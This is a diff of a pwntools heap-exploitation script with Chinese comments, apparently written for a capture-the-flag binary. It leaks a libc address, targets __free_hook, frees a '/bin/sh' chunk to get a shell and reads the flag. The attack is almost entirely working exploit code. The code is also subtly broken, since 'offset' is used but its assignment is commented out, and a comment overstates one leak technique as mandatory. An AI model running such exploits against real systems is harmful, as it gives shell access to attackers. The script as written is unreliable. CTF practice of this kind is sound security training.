@@ -27,8 +27,14 @@ def show(index):
     # ...
 
 # --- 漏洞利用 ---
-# 1. 泄露 libc 基地址 (假设已完成)
-# libc.address = ...
+# 1. 泄露 libc 基地址
+# 通过 unsorted bin 泄露，使用 pwndbg 的 vmmap 计算偏移
+# **【必须】使用 \x7f 方式接收泄露数据，这是定位 libc 地址的标准方法**
+# libc 地址的高字节总是 0x7f，通过 recvuntil(b'\x7f') 可以精确定位
+# 其他接收方式（如固定长度接收）容易受到输出格式变化的影响，导致地址解析错误
+leaked = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+# offset = leaked - libc_base_from_vmmap
+libc.address = leaked - offset
 
 # 2. 计算目标地址
 free_hook = libc.symbols['__free_hook']
@@ -58,8 +64,9 @@ add(0x20, b'/bin/sh\x00') # chunk 4
 delete(4) # free("/bin/sh") -> system("/bin/sh")
 
 # 自动化获取 flag
-p.sendline(b'cat /root/flag')
-flag = p.recvline(timeout=2).decode().strip()
+p.sendline(b'cat ~/flag')
+p.recvuntil(b'flag')
+flag = p.recvline().decode().strip()
 log.success(f"Flag: {flag}")
 ```
 
